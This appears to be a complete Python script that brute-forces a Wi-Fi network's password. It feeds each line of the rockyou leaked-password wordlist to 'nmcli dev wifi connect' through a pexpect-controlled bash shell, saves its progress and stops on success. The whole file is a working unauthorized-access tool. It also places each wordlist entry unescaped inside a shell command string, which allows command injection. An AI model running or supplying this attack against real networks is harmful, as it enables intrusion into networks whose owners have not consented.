#!/usr/bin/env python

import sys, os, time
import pexpect
from json import load, dump


ROCKYOU_PATH=os.environ.get("ROCKYOU_PATH") \
        or os.path.abspath("/home/marc/Downloads/rockyou.txt")
CONF_FILE_PATH=os.environ.get("CONF_FILE_PATH")
TIMESTEP=1


t = 0
t0 = time.time()


with open("bruteforce.json", "r") as conf_file:
    conf = load(conf_file)
print(conf)

os.system("nmcli dev wifi list")
ssid=input("ssid: ")


child = pexpect.spawn("/bin/bash", encoding="utf-8")
with open("/tmp/pexpect_test", "w") as stream:
    child.logfile = stream
    # child.expect("Your bash prompt here")
    with open(ROCKYOU_PATH, "rb") as rockyou:
        n = len(rockyou.read())
    with open(ROCKYOU_PATH, "rb") as rockyou:
        for i,line in enumerate(rockyou.readlines()):
            if time.time() - t > TIMESTEP:
                t = time.time()
                print(f"{i}/{n}, {int(i/n*10000)/100}/100 {int(t-t0)}s")
            password=line.decode().strip()
            child.sendline(f"nmcli dev wifi connect '{ssid}' password '{password}'")
            child.expect(".*\$ ")
            child.readline()
            result=child.readline()
            print(password)
            conf["i"] = i
            conf["password"] = password
            with open("bruteforce.json", "w") as conf_file:
                dump(conf, conf_file)
            if "successfully" in result:
                print(result)
                exit(0)
